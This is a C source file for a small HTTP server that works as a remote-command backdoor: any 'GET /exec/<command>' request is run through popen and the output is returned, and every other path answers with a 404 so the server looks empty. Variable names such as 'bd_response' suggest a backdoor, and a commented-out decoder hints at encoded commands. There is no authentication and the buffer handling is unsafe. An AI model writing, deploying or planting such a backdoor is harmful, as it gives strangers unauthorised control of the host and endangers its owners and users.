#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

int parse(const char *request) {
    if (memcmp(request, "GET /exec/", strlen("GET /exec/")) == 0) {
        return 1;
    }
    else {
        return 0;
    }
}

char* get_cmd(char request[]) {
    size_t b4_cmd = strspn(request, "GET /exec/");
    request += b4_cmd;
    char* token = strtok(request, " ");
    return token;
}

int main(int argc, char *argv[]) {

    int port = atoi(argv[1]);

    int server_socket;
    server_socket = socket(PF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    server_address.sin_addr.s_addr = INADDR_ANY;

    bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address));

    listen(server_socket, 1);    

    //DOUBLE CHECK THIS HEADER FOR ACCURACY RE: RFC2616
    //MUST ALLOW GET AND HEAD METHODS, NONE ELSE - code 405 method not allowed
    char *notfound_response =
        "HTTP/1.1 404 Not Found\r\n\r\n";

    char *bd_response = 
        "HTTP/1.1 200 OK\r\n\r\n";

    int client_socket;
    char client_buffer[1024];

    //Need to figure out how to safely close socket on ^C or SIGINT

    while(1) {
        client_socket = accept(server_socket, NULL, NULL);
        recv(client_socket, &client_buffer, sizeof(client_buffer), 0);
        int bd_check = parse(client_buffer);

        if (bd_check > 0) {
            char* cmd = get_cmd(client_buffer);
            //char* cmd_dec = dhex(cmd);
            
            char cart[1024];
            char out[1024] = "";
            FILE *pipeout;
            
            pipeout = popen(cmd, "r");
            while (fgets(cart, sizeof(cart), pipeout) != NULL) {
                strcat(out, cart);
            }
            pclose(pipeout);
            
            send(client_socket, bd_response, strlen(bd_response), 0);
            send(client_socket, out, strlen(out), 0);
            close(client_socket);
        }
        
        else {
            send(client_socket, notfound_response, strlen(notfound_response), 0);
            close(client_socket);
        }
    }
    
    return 0;

    //Flush socket and close at end!!
}
